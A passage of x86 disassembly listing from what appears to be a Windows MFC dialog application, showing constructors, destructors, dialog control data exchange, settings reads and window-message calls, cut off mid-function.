  4032bb:	c2 04 00             	ret    $0x4
  4032be:	90                   	nop
  4032bf:	90                   	nop
  4032c0:	b8 14 8c 41 00       	mov    $0x418c14,%eax
  4032c5:	c3                   	ret
  4032c6:	90                   	nop
  4032c7:	90                   	nop
  4032c8:	90                   	nop
  4032c9:	90                   	nop
  4032ca:	90                   	nop
  4032cb:	90                   	nop
  4032cc:	90                   	nop
  4032cd:	90                   	nop
  4032ce:	90                   	nop
  4032cf:	90                   	nop
  4032d0:	e9 53 0f 01 00       	jmp    0x414228
  4032d5:	90                   	nop
  4032d6:	90                   	nop
  4032d7:	90                   	nop
  4032d8:	90                   	nop
  4032d9:	90                   	nop
  4032da:	90                   	nop
  4032db:	90                   	nop
  4032dc:	90                   	nop
  4032dd:	90                   	nop
  4032de:	90                   	nop
  4032df:	90                   	nop
  4032e0:	51                   	push   %ecx
  4032e1:	56                   	push   %esi
  4032e2:	8b f1                	mov    %ecx,%esi
  4032e4:	e8 f9 0c 01 00       	call   0x413fe2
  4032e9:	e8 e8 0c 01 00       	call   0x413fd6
  4032ee:	8b 40 04             	mov    0x4(%eax),%eax
  4032f1:	68 d8 e0 41 00       	push   $0x41e0d8
  4032f6:	68 cc e0 41 00       	push   $0x41e0cc
  4032fb:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4032ff:	68 c4 e0 41 00       	push   $0x41e0c4
  403304:	51                   	push   %ecx
  403305:	8b c8                	mov    %eax,%ecx
  403307:	e8 28 0f 01 00       	call   0x414234
  40330c:	8b 10                	mov    (%eax),%edx
  40330e:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  403314:	52                   	push   %edx
  403315:	6a 00                	push   $0x0
  403317:	68 43 01 00 00       	push   $0x143
  40331c:	50                   	push   %eax
  40331d:	ff 15 5c 86 41 00    	call   *0x41865c
  403323:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403327:	e8 ac 0d 01 00       	call   0x4140d8
  40332c:	b8 01 00 00 00       	mov    $0x1,%eax
  403331:	5e                   	pop    %esi
  403332:	59                   	pop    %ecx
  403333:	c3                   	ret
  403334:	90                   	nop
  403335:	90                   	nop
  403336:	90                   	nop
  403337:	90                   	nop
  403338:	90                   	nop
  403339:	90                   	nop
  40333a:	90                   	nop
  40333b:	90                   	nop
  40333c:	90                   	nop
  40333d:	90                   	nop
  40333e:	90                   	nop
  40333f:	90                   	nop
  403340:	56                   	push   %esi
  403341:	8b f1                	mov    %ecx,%esi
  403343:	e8 ce 0e 01 00       	call   0x414216
  403348:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40334d:	74 09                	je     0x403358
  40334f:	56                   	push   %esi
  403350:	e8 5b 0b 01 00       	call   0x413eb0
  403355:	83 c4 04             	add    $0x4,%esp
  403358:	8b c6                	mov    %esi,%eax
  40335a:	5e                   	pop    %esi
  40335b:	c2 04 00             	ret    $0x4
  40335e:	90                   	nop
  40335f:	90                   	nop
  403360:	6a ff                	push   $0xffffffff
  403362:	68 df 4c 41 00       	push   $0x414cdf
  403367:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40336d:	50                   	push   %eax
  40336e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403375:	51                   	push   %ecx
  403376:	8b 44 24 14          	mov    0x14(%esp),%eax
  40337a:	53                   	push   %ebx
  40337b:	56                   	push   %esi
  40337c:	57                   	push   %edi
  40337d:	8b f1                	mov    %ecx,%esi
  40337f:	50                   	push   %eax
  403380:	68 a8 00 00 00       	push   $0xa8
  403385:	89 74 24 14          	mov    %esi,0x14(%esp)
  403389:	e8 36 0c 01 00       	call   0x413fc4
  40338e:	8d 5e 60             	lea    0x60(%esi),%ebx
  403391:	33 ff                	xor    %edi,%edi
  403393:	8b cb                	mov    %ebx,%ecx
  403395:	89 7c 24 18          	mov    %edi,0x18(%esp)
  403399:	e8 9e 0c 01 00       	call   0x41403c
  40339e:	c7 03 30 89 41 00    	movl   $0x418930,(%ebx)
  4033a4:	8d 9e a0 00 00 00    	lea    0xa0(%esi),%ebx
  4033aa:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  4033af:	8b cb                	mov    %ebx,%ecx
  4033b1:	e8 86 0c 01 00       	call   0x41403c
  4033b6:	c7 03 30 89 41 00    	movl   $0x418930,(%ebx)
  4033bc:	8d 9e e0 00 00 00    	lea    0xe0(%esi),%ebx
  4033c2:	c6 44 24 18 02       	movb   $0x2,0x18(%esp)
  4033c7:	8b cb                	mov    %ebx,%ecx
  4033c9:	e8 6e 0c 01 00       	call   0x41403c
  4033ce:	c7 03 30 89 41 00    	movl   $0x418930,(%ebx)
  4033d4:	8d 9e 20 01 00 00    	lea    0x120(%esi),%ebx
  4033da:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  4033df:	8b cb                	mov    %ebx,%ecx
  4033e1:	e8 56 0c 01 00       	call   0x41403c
  4033e6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4033ea:	c7 03 08 8f 41 00    	movl   $0x418f08,(%ebx)
  4033f0:	89 be 60 01 00 00    	mov    %edi,0x160(%esi)
  4033f6:	89 be 64 01 00 00    	mov    %edi,0x164(%esi)
  4033fc:	89 be 68 01 00 00    	mov    %edi,0x168(%esi)
  403402:	89 be 6c 01 00 00    	mov    %edi,0x16c(%esi)
  403408:	89 be 70 01 00 00    	mov    %edi,0x170(%esi)
  40340e:	89 be 74 01 00 00    	mov    %edi,0x174(%esi)
  403414:	c7 06 30 8e 41 00    	movl   $0x418e30,(%esi)
  40341a:	8b c6                	mov    %esi,%eax
  40341c:	5f                   	pop    %edi
  40341d:	5e                   	pop    %esi
  40341e:	5b                   	pop    %ebx
  40341f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403426:	83 c4 10             	add    $0x10,%esp
  403429:	c2 04 00             	ret    $0x4
  40342c:	90                   	nop
  40342d:	90                   	nop
  40342e:	90                   	nop
  40342f:	90                   	nop
  403430:	56                   	push   %esi
  403431:	8b f1                	mov    %ecx,%esi
  403433:	e8 18 00 00 00       	call   0x403450
  403438:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40343d:	74 09                	je     0x403448
  40343f:	56                   	push   %esi
  403440:	e8 6b 0a 01 00       	call   0x413eb0
  403445:	83 c4 04             	add    $0x4,%esp
  403448:	8b c6                	mov    %esi,%eax
  40344a:	5e                   	pop    %esi
  40344b:	c2 04 00             	ret    $0x4
  40344e:	90                   	nop
  40344f:	90                   	nop
  403450:	6a ff                	push   $0xffffffff
  403452:	68 1f 4d 41 00       	push   $0x414d1f
  403457:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40345d:	50                   	push   %eax
  40345e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403465:	51                   	push   %ecx
  403466:	56                   	push   %esi
  403467:	8b f1                	mov    %ecx,%esi
  403469:	89 74 24 04          	mov    %esi,0x4(%esp)
  40346d:	8d 8e 20 01 00 00    	lea    0x120(%esi),%ecx
  403473:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  40347a:	00 
  40347b:	e8 c0 0d 01 00       	call   0x414240
  403480:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  403486:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  40348b:	e8 9a 0b 01 00       	call   0x41402a
  403490:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  403496:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  40349b:	e8 8a 0b 01 00       	call   0x41402a
  4034a0:	8d 4e 60             	lea    0x60(%esi),%ecx
  4034a3:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  4034a8:	e8 7d 0b 01 00       	call   0x41402a
  4034ad:	8b ce                	mov    %esi,%ecx
  4034af:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4034b6:	ff 
  4034b7:	e8 02 0b 01 00       	call   0x413fbe
  4034bc:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4034c0:	5e                   	pop    %esi
  4034c1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4034c8:	83 c4 10             	add    $0x10,%esp
  4034cb:	c3                   	ret
  4034cc:	90                   	nop
  4034cd:	90                   	nop
  4034ce:	90                   	nop
  4034cf:	90                   	nop
  4034d0:	56                   	push   %esi
  4034d1:	8b f1                	mov    %ecx,%esi
  4034d3:	57                   	push   %edi
  4034d4:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4034d8:	8d 46 60             	lea    0x60(%esi),%eax
  4034db:	50                   	push   %eax
  4034dc:	68 0e 04 00 00       	push   $0x40e
  4034e1:	57                   	push   %edi
  4034e2:	e8 e3 0a 01 00       	call   0x413fca
  4034e7:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  4034ed:	51                   	push   %ecx
  4034ee:	68 14 04 00 00       	push   $0x414
  4034f3:	57                   	push   %edi
  4034f4:	e8 d1 0a 01 00       	call   0x413fca
  4034f9:	8d 96 e0 00 00 00    	lea    0xe0(%esi),%edx
  4034ff:	52                   	push   %edx
  403500:	68 15 04 00 00       	push   $0x415
  403505:	57                   	push   %edi
  403506:	e8 bf 0a 01 00       	call   0x413fca
  40350b:	8d 86 20 01 00 00    	lea    0x120(%esi),%eax
  403511:	50                   	push   %eax
  403512:	68 17 04 00 00       	push   $0x417
  403517:	57                   	push   %edi
  403518:	e8 ad 0a 01 00       	call   0x413fca
  40351d:	8d 8e 60 01 00 00    	lea    0x160(%esi),%ecx
  403523:	51                   	push   %ecx
  403524:	68 0f 04 00 00       	push   $0x40f
  403529:	57                   	push   %edi
  40352a:	e8 17 0d 01 00       	call   0x414246
  40352f:	8d 96 64 01 00 00    	lea    0x164(%esi),%edx
  403535:	52                   	push   %edx
  403536:	68 0e 04 00 00       	push   $0x40e
  40353b:	57                   	push   %edi
  40353c:	e8 05 0d 01 00       	call   0x414246
  403541:	8d 86 68 01 00 00    	lea    0x168(%esi),%eax
  403547:	50                   	push   %eax
  403548:	68 11 04 00 00       	push   $0x411
  40354d:	57                   	push   %edi
  40354e:	e8 f3 0c 01 00       	call   0x414246
  403553:	8d 8e 6c 01 00 00    	lea    0x16c(%esi),%ecx
  403559:	51                   	push   %ecx
  40355a:	68 10 04 00 00       	push   $0x410
  40355f:	57                   	push   %edi
  403560:	e8 e1 0c 01 00       	call   0x414246
  403565:	8d 96 70 01 00 00    	lea    0x170(%esi),%edx
  40356b:	52                   	push   %edx
  40356c:	68 14 04 00 00       	push   $0x414
  403571:	57                   	push   %edi
  403572:	e8 cf 0c 01 00       	call   0x414246
  403577:	81 c6 74 01 00 00    	add    $0x174,%esi
  40357d:	56                   	push   %esi
  40357e:	68 15 04 00 00       	push   $0x415
  403583:	57                   	push   %edi
  403584:	e8 bd 0c 01 00       	call   0x414246
  403589:	5f                   	pop    %edi
  40358a:	5e                   	pop    %esi
  40358b:	c2 04 00             	ret    $0x4
  40358e:	90                   	nop
  40358f:	90                   	nop
  403590:	b8 28 8e 41 00       	mov    $0x418e28,%eax
  403595:	c3                   	ret
  403596:	90                   	nop
  403597:	90                   	nop
  403598:	90                   	nop
  403599:	90                   	nop
  40359a:	90                   	nop
  40359b:	90                   	nop
  40359c:	90                   	nop
  40359d:	90                   	nop
  40359e:	90                   	nop
  40359f:	90                   	nop
  4035a0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4035a6:	6a ff                	push   $0xffffffff
  4035a8:	68 40 4d 41 00       	push   $0x414d40
  4035ad:	50                   	push   %eax
  4035ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4035b5:	83 ec 18             	sub    $0x18,%esp
  4035b8:	56                   	push   %esi
  4035b9:	8b f1                	mov    %ecx,%esi
  4035bb:	e8 22 0a 01 00       	call   0x413fe2
  4035c0:	e8 11 0a 01 00       	call   0x413fd6
  4035c5:	8b 40 04             	mov    0x4(%eax),%eax
  4035c8:	6a 01                	push   $0x1
  4035ca:	68 38 e1 41 00       	push   $0x41e138
  4035cf:	68 30 e1 41 00       	push   $0x41e130
  4035d4:	8b c8                	mov    %eax,%ecx
  4035d6:	e8 89 0c 01 00       	call   0x414264
  4035db:	89 86 6c 01 00 00    	mov    %eax,0x16c(%esi)
  4035e1:	e8 f0 09 01 00       	call   0x413fd6
  4035e6:	8b 40 04             	mov    0x4(%eax),%eax
  4035e9:	6a 00                	push   $0x0
  4035eb:	68 24 e1 41 00       	push   $0x41e124
  4035f0:	68 30 e1 41 00       	push   $0x41e130
  4035f5:	8b c8                	mov    %eax,%ecx
  4035f7:	e8 68 0c 01 00       	call   0x414264
  4035fc:	89 86 68 01 00 00    	mov    %eax,0x168(%esi)
  403602:	e8 cf 09 01 00       	call   0x413fd6
  403607:	8b 40 04             	mov    0x4(%eax),%eax
  40360a:	6a 00                	push   $0x0
  40360c:	68 20 e1 41 00       	push   $0x41e120
  403611:	68 30 e1 41 00       	push   $0x41e130
  403616:	8b c8                	mov    %eax,%ecx
  403618:	e8 47 0c 01 00       	call   0x414264
  40361d:	89 86 60 01 00 00    	mov    %eax,0x160(%esi)
  403623:	e8 ae 09 01 00       	call   0x413fd6
  403628:	8b 40 04             	mov    0x4(%eax),%eax
  40362b:	6a 01                	push   $0x1
  40362d:	68 18 e1 41 00       	push   $0x41e118
  403632:	68 30 e1 41 00       	push   $0x41e130
  403637:	8b c8                	mov    %eax,%ecx
  403639:	e8 26 0c 01 00       	call   0x414264
  40363e:	89 86 64 01 00 00    	mov    %eax,0x164(%esi)
  403644:	e8 8d 09 01 00       	call   0x413fd6
  403649:	8b 40 04             	mov    0x4(%eax),%eax
  40364c:	6a 00                	push   $0x0
  40364e:	68 0c e1 41 00       	push   $0x41e10c
  403653:	68 30 e1 41 00       	push   $0x41e130
  403658:	8b c8                	mov    %eax,%ecx
  40365a:	e8 05 0c 01 00       	call   0x414264
  40365f:	89 86 70 01 00 00    	mov    %eax,0x170(%esi)
  403665:	e8 6c 09 01 00       	call   0x413fd6
  40366a:	8b 40 04             	mov    0x4(%eax),%eax
  40366d:	6a 00                	push   $0x0
  40366f:	68 04 e1 41 00       	push   $0x41e104
  403674:	68 30 e1 41 00       	push   $0x41e130
  403679:	8b c8                	mov    %eax,%ecx
  40367b:	e8 e4 0b 01 00       	call   0x414264
  403680:	89 86 74 01 00 00    	mov    %eax,0x174(%esi)
  403686:	8b 86 70 01 00 00    	mov    0x170(%esi),%eax
  40368c:	85 c0                	test   %eax,%eax
  40368e:	75 0d                	jne    0x40369d
  403690:	6a 00                	push   $0x0
  403692:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  403698:	e8 c1 0b 01 00       	call   0x41425e
  40369d:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4036a1:	e8 50 0a 01 00       	call   0x4140f6
  4036a6:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4036ad:	00 
  4036ae:	e8 23 09 01 00       	call   0x413fd6
  4036b3:	8b 40 04             	mov    0x4(%eax),%eax
  4036b6:	68 f8 e0 41 00       	push   $0x41e0f8
  4036bb:	68 f0 e0 41 00       	push   $0x41e0f0
  4036c0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4036c4:	68 30 e1 41 00       	push   $0x41e130
  4036c9:	51                   	push   %ecx
  4036ca:	8b c8                	mov    %eax,%ecx
  4036cc:	e8 63 0b 01 00       	call   0x414234
  4036d1:	50                   	push   %eax
  4036d2:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4036d6:	c6 44 24 28 01       	movb   $0x1,0x28(%esp)
  4036db:	e8 78 0b 01 00       	call   0x414258
  4036e0:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4036e4:	c6 44 24 24 00       	movb   $0x0,0x24(%esp)
  4036e9:	e8 ea 09 01 00       	call   0x4140d8
  4036ee:	8d 54 24 18          	lea    0x18(%esp),%edx
  4036f2:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036f6:	52                   	push   %edx
  4036f7:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4036fb:	50                   	push   %eax
  4036fc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403700:	8d 54 24 14          	lea    0x14(%esp),%edx
  403704:	51                   	push   %ecx
  403705:	52                   	push   %edx
  403706:	68 e4 e0 41 00       	push   $0x41e0e4
  40370b:	50                   	push   %eax
  40370c:	ff 15 78 85 41 00    	call   *0x418578
  403712:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403716:	8b 54 24 28          	mov    0x28(%esp),%edx
  40371a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40371e:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403724:	c1 e1 08             	shl    $0x8,%ecx
  403727:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40372d:	25 ff 00 00 00       	and    $0xff,%eax
  403732:	03 ca                	add    %edx,%ecx
  403734:	8b 54 24 30          	mov    0x30(%esp),%edx
  403738:	c1 e1 08             	shl    $0x8,%ecx
  40373b:	03 c8                	add    %eax,%ecx
  40373d:	8b 86 40 01 00 00    	mov    0x140(%esi),%eax
  403743:	c1 e1 08             	shl    $0x8,%ecx
  403746:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40374c:	83 c4 18             	add    $0x18,%esp
  40374f:	03 ca                	add    %edx,%ecx
  403751:	51                   	push   %ecx
  403752:	6a 00                	push   $0x0
  403754:	68 65 04 00 00       	push   $0x465
  403759:	50                   	push   %eax
  40375a:	ff 15 5c 86 41 00    	call   *0x41865c
  403760:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403764:	51                   	push   %ecx
  403765:	8d 8e 20 01 00 00    	lea    0x120(%esi),%ecx
  40376b:	e8 e2 0a 01 00       	call   0x414252
  403770:	6a 00                	push   $0x0
  403772:	8b ce                	mov    %esi,%ecx
  403774:	e8 d3 0a 01 00       	call   0x41424c
  403779:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40377d:	c7 44 24 24 ff ff ff 	movl   $0xffffffff,0x24(%esp)
  403784:	ff 
  403785:	e8 4e 09 01 00       	call   0x4140d8
  40378a:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40378e:	b8 01 00 00 00       	mov    $0x1,%eax
  403793:	5e                   	pop    %esi
  403794:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40379b:	83 c4 24             	add    $0x24,%esp
  40379e:	c3                   	ret
  40379f:	90                   	nop
  4037a0:	e9 5f 07 01 00       	jmp    0x413f04
  4037a5:	90                   	nop
  4037a6:	90                   	nop
  4037a7:	90                   	nop
  4037a8:	90                   	nop
  4037a9:	90                   	nop
  4037aa:	90                   	nop
  4037ab:	90                   	nop
  4037ac:	90                   	nop
  4037ad:	90                   	nop
  4037ae:	90                   	nop
  4037af:	90                   	nop
  4037b0:	56                   	push   %esi
  4037b1:	8b f1                	mov    %ecx,%esi
  4037b3:	57                   	push   %edi
  4037b4:	8b 3d 5c 86 41 00    	mov    0x41865c,%edi
  4037ba:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  4037c0:	6a 00                	push   $0x0
  4037c2:	6a 00                	push   $0x0
  4037c4:	68 f0 00 00 00       	push   $0xf0
  4037c9:	50                   	push   %eax
  4037ca:	ff d7                	call   *%edi
  4037cc:	85 c0                	test   %eax,%eax
  4037ce:	74 10                	je     0x4037e0
  4037d0:	6a 01                	push   $0x1
  4037d2:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  4037d8:	e8 81 0a 01 00       	call   0x41425e
  4037dd:	5f                   	pop    %edi
  4037de:	5e                   	pop    %esi
  4037df:	c3                   	ret
  4037e0:	8b 8e 00 01 00 00    	mov    0x100(%esi),%ecx
  4037e6:	6a 00                	push   $0x0
  4037e8:	6a 00                	push   $0x0
  4037ea:	68 f1 00 00 00       	push   $0xf1
  4037ef:	51                   	push   %ecx
  4037f0:	ff d7                	call   *%edi
  4037f2:	6a 00                	push   $0x0
  4037f4:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  4037fa:	e8 5f 0a 01 00       	call   0x41425e
  4037ff:	5f                   	pop    %edi
  403800:	5e                   	pop    %esi
  403801:	c3                   	ret
  403802:	90                   	nop
  403803:	90                   	nop
  403804:	90                   	nop
  403805:	90                   	nop
  403806:	90                   	nop
  403807:	90                   	nop
  403808:	90                   	nop
  403809:	90                   	nop
  40380a:	90                   	nop
  40380b:	90                   	nop
  40380c:	90                   	nop
  40380d:	90                   	nop
  40380e:	90                   	nop
  40380f:	90                   	nop
  403810:	56                   	push   %esi
  403811:	8b f1                	mov    %ecx,%esi
  403813:	57                   	push   %edi
  403814:	8b 3d 5c 86 41 00    	mov    0x41865c,%edi
  40381a:	8b 86 00 01 00 00    	mov    0x100(%esi),%eax
  403820:	6a 00                	push   $0x0
  403822:	6a 00                	push   $0x0
  403824:	68 f0 00 00 00       	push   $0xf0
  403829:	50                   	push   %eax
  40382a:	ff d7                	call   *%edi
  40382c:	85 c0                	test   %eax,%eax
  40382e:	74 12                	je     0x403842
  403830:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  403836:	6a 00                	push   $0x0
  403838:	6a 01                	push   $0x1
  40383a:	68 f1 00 00 00       	push   $0xf1
  40383f:	51                   	push   %ecx
  403840:	ff d7                	call   *%edi
  403842:	5f                   	pop    %edi
  403843:	5e                   	pop    %esi
  403844:	c3                   	ret
  403845:	90                   	nop
  403846:	90                   	nop
  403847:	90                   	nop
  403848:	90                   	nop
  403849:	90                   	nop
  40384a:	90                   	nop
  40384b:	90                   	nop
  40384c:	90                   	nop
  40384d:	90                   	nop
  40384e:	90                   	nop
  40384f:	90                   	nop
  403850:	56                   	push   %esi
  403851:	8b f1                	mov    %ecx,%esi
  403853:	e8 e8 09 01 00       	call   0x414240
  403858:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40385d:	74 09                	je     0x403868
  40385f:	56                   	push   %esi
  403860:	e8 4b 06 01 00       	call   0x413eb0
  403865:	83 c4 04             	add    $0x4,%esp
  403868:	8b c6                	mov    %esi,%eax
  40386a:	5e                   	pop    %esi
  40386b:	c2 04 00             	ret    $0x4
  40386e:	90                   	nop
  40386f:	90                   	nop
  403870:	6a ff                	push   $0xffffffff
  403872:	68 79 4d 41 00       	push   $0x414d79
  403877:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40387d:	50                   	push   %eax
  40387e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403885:	51                   	push   %ecx
  403886:	56                   	push   %esi
  403887:	8b f1                	mov    %ecx,%esi
  403889:	57                   	push   %edi
  40388a:	89 74 24 08          	mov    %esi,0x8(%esp)
  40388e:	e8 a9 07 01 00       	call   0x41403c
  403893:	c7 06 08 91 41 00    	movl   $0x419108,(%esi)
  403899:	8d 7e 54             	lea    0x54(%esi),%edi
  40389c:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4038a3:	00 
  4038a4:	8b cf                	mov    %edi,%ecx
  4038a6:	e8 4b 08 01 00       	call   0x4140f6
  4038ab:	c7 46 5c 00 00 00 00 	movl   $0x0,0x5c(%esi)
  4038b2:	c7 46 58 f0 90 41 00 	movl   $0x4190f0,0x58(%esi)
  4038b9:	8d 4e 64             	lea    0x64(%esi),%ecx
  4038bc:	c6 44 24 14 02       	movb   $0x2,0x14(%esp)
  4038c1:	e8 70 07 01 00       	call   0x414036
  4038c6:	b8 01 00 00 00       	mov    $0x1,%eax
  4038cb:	8b cf                	mov    %edi,%ecx
  4038cd:	c6 44 24 14 03       	movb   $0x3,0x14(%esp)
  4038d2:	c7 06 30 90 41 00    	movl   $0x419030,(%esi)
  4038d8:	c7 46 40 00 00 ee 00 	movl   $0xee0000,0x40(%esi)
  4038df:	c7 46 44 55 1a 8b 00 	movl   $0x8b1a55,0x44(%esi)
  4038e6:	c7 46 48 00 00 00 00 	movl   $0x0,0x48(%esi)
  4038ed:	89 46 4c             	mov    %eax,0x4c(%esi)
  4038f0:	89 46 50             	mov    %eax,0x50(%esi)
  4038f3:	e8 f2 07 01 00       	call   0x4140ea
  4038f8:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4038fc:	8b c6                	mov    %esi,%eax
  4038fe:	5f                   	pop    %edi
  4038ff:	5e                   	pop    %esi
  403900:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403907:	83 c4 10             	add    $0x10,%esp
  40390a:	c3                   	ret
  40390b:	90                   	nop
  40390c:	90                   	nop
  40390d:	90                   	nop
  40390e:	90                   	nop
  40390f:	90                   	nop
  403910:	56                   	push   %esi
  403911:	8b f1                	mov    %ecx,%esi
  403913:	e8 18 00 00 00       	call   0x403930
  403918:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40391d:	74 09                	je     0x403928
  40391f:	56                   	push   %esi
  403920:	e8 8b 05 01 00       	call   0x413eb0
  403925:	83 c4 04             	add    $0x4,%esp
  403928:	8b c6                	mov    %esi,%eax
  40392a:	5e                   	pop    %esi
  40392b:	c2 04 00             	ret    $0x4
  40392e:	90                   	nop
  40392f:	90                   	nop
  403930:	6a ff                	push   $0xffffffff
  403932:	68 c1 4d 41 00       	push   $0x414dc1
  403937:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40393d:	50                   	push   %eax
  40393e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403945:	83 ec 08             	sub    $0x8,%esp
  403948:	56                   	push   %esi
  403949:	8b f1                	mov    %ecx,%esi
  40394b:	57                   	push   %edi
  40394c:	89 74 24 08          	mov    %esi,0x8(%esp)
  403950:	c7 06 30 90 41 00    	movl   $0x419030,(%esi)
  403956:	8d 7e 58             	lea    0x58(%esi),%edi
  403959:	c7 44 24 18 03 00 00 	movl   $0x3,0x18(%esp)
  403960:	00 
  403961:	85 ff                	test   %edi,%edi
  403963:	74 0e                	je     0x403973
  403965:	8b 47 04             	mov    0x4(%edi),%eax
  403968:	85 c0                	test   %eax,%eax
  40396a:	74 07                	je     0x403973
  40396c:	8b cf                	mov    %edi,%ecx
  40396e:	e8 db 06 01 00       	call   0x41404e
  403973:	8d 4e 64             	lea    0x64(%esi),%ecx
  403976:	c6 44 24 18 02       	movb   $0x2,0x18(%esp)
  40397b:	e8 a4 06 01 00       	call   0x414024
  403980:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403984:	c7 07 08 8a 41 00    	movl   $0x418a08,(%edi)
  40398a:	8b cf                	mov    %edi,%ecx
  40398c:	c6 44 24 18 04       	movb   $0x4,0x18(%esp)
  403991:	e8 b8 06 01 00       	call   0x41404e
  403996:	8d 4e 54             	lea    0x54(%esi),%ecx
  403999:	c7 07 f4 89 41 00    	movl   $0x4189f4,(%edi)
  40399f:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
  4039a4:	e8 2f 07 01 00       	call   0x4140d8
  4039a9:	8b ce                	mov    %esi,%ecx
  4039ab:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  4039b2:	ff 
  4039b3:	e8 be 08 01 00       	call   0x414276
  4039b8:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039bc:	5f                   	pop    %edi
  4039bd:	5e                   	pop    %esi
  4039be:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4039c5:	83 c4 14             	add    $0x14,%esp
  4039c8:	c3                   	ret
  4039c9:	90                   	nop
  4039ca:	90                   	nop
  4039cb:	90                   	nop
  4039cc:	90                   	nop
  4039cd:	90                   	nop
  4039ce:	90                   	nop
  4039cf:	90                   	nop
  4039d0:	b8 28 90 41 00       	mov    $0x419028,%eax
  4039d5:	c3                   	ret
  4039d6:	90                   	nop
  4039d7:	90                   	nop
  4039d8:	90                   	nop
  4039d9:	90                   	nop
  4039da:	90                   	nop
  4039db:	90                   	nop
  4039dc:	90                   	nop
  4039dd:	90                   	nop
  4039de:	90                   	nop
  4039df:	90                   	nop
  4039e0:	56                   	push   %esi
  4039e1:	57                   	push   %edi
  4039e2:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4039e6:	8b f1                	mov    %ecx,%esi
  4039e8:	57                   	push   %edi
  4039e9:	6a 00                	push   $0x0
  4039eb:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  4039f1:	68 07 04 00 00       	push   $0x407
  4039f6:	50                   	push   %eax
  4039f7:	ff 15 5c 86 41 00    	call   *0x41865c
  4039fd:	57                   	push   %edi
  4039fe:	8b ce                	mov    %esi,%ecx
  403a00:	e8 e9 05 01 00       	call   0x413fee
  403a05:	5f                   	pop    %edi
  403a06:	5e                   	pop    %esi
  403a07:	c2 04 00             	ret    $0x4
  403a0a:	90                   	nop
  403a0b:	90                   	nop
  403a0c:	90                   	nop
  403a0d:	90                   	nop
  403a0e:	90                   	nop
  403a0f:	90                   	nop
  403a10:	83 ec 3c             	sub    $0x3c,%esp
  403a13:	53                   	push   %ebx
  403a14:	8b 5c 24 44          	mov    0x44(%esp),%ebx
  403a18:	56                   	push   %esi
  403a19:	8b f1                	mov    %ecx,%esi
  403a1b:	8b 46 48             	mov    0x48(%esi),%eax
  403a1e:	85 c0                	test   %eax,%eax
  403a20:	74 0d                	je     0x403a2f
  403a22:	8b 4e 44             	mov    0x44(%esi),%ecx
  403a25:	8b 03                	mov    (%ebx),%eax
  403a27:	51                   	push   %ecx
  403a28:	8b cb                	mov    %ebx,%ecx
  403a2a:	ff 50 38             	call   *0x38(%eax)
  403a2d:	eb 0b                	jmp    0x403a3a
  403a2f:	8b 46 40             	mov    0x40(%esi),%eax
  403a32:	8b 13                	mov    (%ebx),%edx
  403a34:	50                   	push   %eax
  403a35:	8b cb                	mov    %ebx,%ecx
  403a37:	ff 52 38             	call   *0x38(%edx)
